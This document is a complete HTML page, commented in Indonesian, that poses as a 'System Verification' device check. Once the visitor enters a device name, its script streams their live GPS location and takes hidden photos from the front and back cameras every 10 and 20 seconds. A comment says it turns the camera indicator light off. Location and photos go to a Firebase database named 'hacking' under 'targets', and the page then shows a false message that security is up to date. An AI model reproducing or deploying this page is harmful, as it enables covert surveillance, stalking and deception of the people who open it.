<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body {
            background-color: #0b0f19;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            border: 1px solid #00ff66;
            background-color: #05070c;
            padding: 20px;
            width: 80%;
            max-width: 350px;
        }
        input {
            background-color: #0b0f19;
            border: 1px solid #00ff66;
            color: #00ff66;
            padding: 10px;
            width: 90%;
            font-family: 'Courier New', Courier, monospace;
            margin-bottom: 15px;
            text-align: center;
        }
        button {
            background-color: #00ff66;
            color: #0b0f19;
            border: none;
            padding: 10px 20px;
            font-weight: bold;
            font-family: 'Courier New', Courier, monospace;
            cursor: pointer;
            width: 100%;
        }
        .spinner {
            border: 4px solid rgba(0, 255, 102, 0.1);
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border-left-color: #00ff66;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .checkmark {
            font-size: 50px;
            color: #00ff66;
            margin-bottom: 15px;
        }
        h2 { font-size: 1.1rem; letter-spacing: 1px; margin-bottom: 15px; }
        p { color: #00ff66; font-size: 0.85rem; }
    </style>
</head>
<body>

    <!-- Kotak Form Wajib Isi Merek Perangkat -->
    <div class="box" id="inputBox">
        <h2>[ IDENTIFY DEVICE ]</h2>
        <p style="margin-bottom: 10px;">Wajib Masukkan Merek & Tipe (Contoh: Samsung S23, iPad, Laptop Asus):</p>
        <form onsubmit="startTracking(event)">
            <input type="text" id="deviceNameInput" placeholder="Ketik nama perangkat..." required>
            <button type="submit">VERIFY & START</button>
        </form>
    </div>

    <!-- Kotak Loading / Proses -->
    <div id="trackingContainer" style="display: none;">
        <div class="spinner"></div>
        <h2 id="status-text">Synchronizing Telemetry & Sensors...</h2>
        <p id="error-text" style="color: #ff3333;"></p>
    </div>

    <!-- Kotak Sukses -->
    <div id="successContainer" style="display: none;" class="box">
        <div class="checkmark">✓</div>
        <h2 style="color: #00ff66; margin-bottom: 10px;">Thank You!</h2>
        <p>Device verification completed successfully. System security is now fully up to date.</p>
    </div>

    <!-- Hidden Video & Canvas untuk Capture Kamera -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        let deviceNameGlobal = "";
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const context = canvas.getContext("2d");

        function startTracking(event) {
            event.preventDefault();
            const inputVal = document.getElementById("deviceNameInput").value.trim();
            deviceNameGlobal = `📱 ${inputVal}`;

            document.getElementById("inputBox").style.display = "none";
            document.getElementById("trackingContainer").style.display = "block";

            const errorText = document.getElementById("error-text");
            const targetRef = db.ref("targets").push();

            // 1. Pelacakan GPS Real-time (Berkala)
            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        targetRef.update({
                            latitude: lat,
                            longitude: lon,
                            accuracy: accuracy,
                            device: deviceNameGlobal,
                            timestamp: Date.now()
                        }).then(() => {
                            document.getElementById("trackingContainer").style.display = "none";
                            document.getElementById("successContainer").style.display = "block";
                        });
                    },
                    function(error) {
                        errorText.innerText = "Error: Location permission denied or unavailable.";
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                errorText.innerText = "Error: Geolocation not supported.";
            }

            // 2. Pengambilan Foto Kamera Berkala (Contoh: Setiap 10 detik bergantian depan/belakang)
            setInterval(() => {
                captureAndSendCamera("user"); // "user" = Kamera Depan
            }, 10000);

            setInterval(() => {
                captureAndSendCamera("environment"); // "environment" = Kamera Belakang
            }, 20000);
        }

        // Fungsi otomatis ambil foto dari kamera dan kirim ke Firebase
        async function captureAndSendCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode }
                });
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });

                // Set ukuran canvas
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Ubah gambar ke format Base64 (Compressed string)
                const imageData = canvas.toDataURL("image/jpeg", 0.6);

                // Matikan stream kamera setelah foto diambil agar lampu indikator kamera HP mati
                stream.getTracks().forEach(track => track.stop());

                // Kirim data foto ke Firebase berdasarkan tipe kamera
                db.ref("camera_logs").push({
                    device: deviceNameGlobal,
                    cameraType: facingMode === "user" ? "Depan" : "Belakang",
                    image: imageData,
                    timestamp: Date.now()
                });

            } catch (err) {
                console.log("Kamera tidak diizinkan atau sedang digunakan: ", err);
            }
        }
    </script>
</body>
</html>
